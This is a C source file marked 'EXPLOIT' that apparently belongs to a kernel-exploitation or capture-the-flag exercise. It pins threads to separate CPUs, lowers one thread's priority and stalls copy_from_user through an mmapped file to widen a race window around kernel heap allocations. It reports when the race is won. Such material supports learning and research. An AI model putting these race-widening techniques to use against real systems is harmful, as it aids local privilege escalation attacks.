#include "libs/pwn.h"
#include <pthread.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

/*******************************
 * EXPLOIT                     *
 *******************************/

#define BUF_SIZE 0x100
#define SLOW_CPU 1
#define FAST_CPU 2

enum RACE { RACE_ONGOING = 0, RACE_WON, RACE_LOST };

extern volatile int is_busy;
int start_race = -1;
volatile int race_done = 0;

void *fast(void *buf) {
  void *ptr;

  pin_cpu(0, FAST_CPU);

  event_wait(start_race);
  linfo("starting fast thread");

  ptr = keap_malloc(BUF_SIZE, GFP_KERNEL_ACCOUNT);
  keap_read(ptr, buf, BUF_SIZE);

  keap_free(ptr);
  race_done = RACE_LOST;

  linfo("fast thread done");

  return NULL;
}

void *slow(void *slow_buf) {
  void *ptr;

  pin_cpu(0, SLOW_CPU);
  set_scheduler(0, SCHED_IDLE, 0);

  linfo("starting slow thread");

  // slow down execute, increase race window
  ptr = keap_malloc(BUF_SIZE, GFP_KERNEL_ACCOUNT);
  event_signal(start_race);

  // stall copy_from_user using mmaped file
  keap_read(ptr, slow_buf, BUF_SIZE);

  keap_free(ptr);
  race_done = RACE_WON;

  linfo("slow thread done");

  return NULL;
}

int main(int argc, char *argv[]) {
  int fd = -1;
  void *file_map;
  char buf[BUF_SIZE] = {0};
  char rand[8] = {0};
  char filename[5 + (sizeof(rand) * 2) + 1] = "/tmp/";
  pthread_t slow_t, fast_t, busy_t;

  lstage("INIT");

  setvbuf(stdout, NULL, _IONBF, 0);
  pin_cpu(0, 0);
  start_race = event_create();
  init();

  fd = SYSCHK(open("/dev/urandom", O_RDONLY));
  CHK(read(fd, (void *)rand, sizeof(rand)) == sizeof(rand));
  CHK(read(fd, (void *)buf, sizeof(buf)) == sizeof(buf));
  SYSCHK(close(fd));
  to_hex(filename + 5, rand, sizeof(rand));
  filename[sizeof(filename) - 1] = 0;

  linfo("slow file: %s", filename);

  lstage("create slower structs");

  // create target file
  fd = SYSCHK(open(filename, O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR));

  CHK(write(fd, buf, BUF_SIZE) == BUF_SIZE);
  SYSCHK(close(fd));

  fd = SYSCHK(open(filename, O_RDWR));
  file_map = SYSCHK(mmap(NULL, BUF_SIZE, PROT_READ, MAP_SHARED, fd, 0));

  lstage("start race");

  // create a busy thread to slow down execution
  pthread_create(&busy_t, NULL, busy_func, (void *)SLOW_CPU);
  pthread_create(&slow_t, NULL, slow, file_map);
  pthread_create(&fast_t, NULL, fast, (void *)buf);

  pthread_join(slow_t, NULL);
  is_busy = 0;
  pthread_join(busy_t, NULL);
  pthread_join(fast_t, NULL);

  munmap(file_map, BUF_SIZE);
  close(fd);
  close(start_race);

  if (race_done == RACE_LOST)
    lerror("failed racer");

  linfo("won race!!");
}
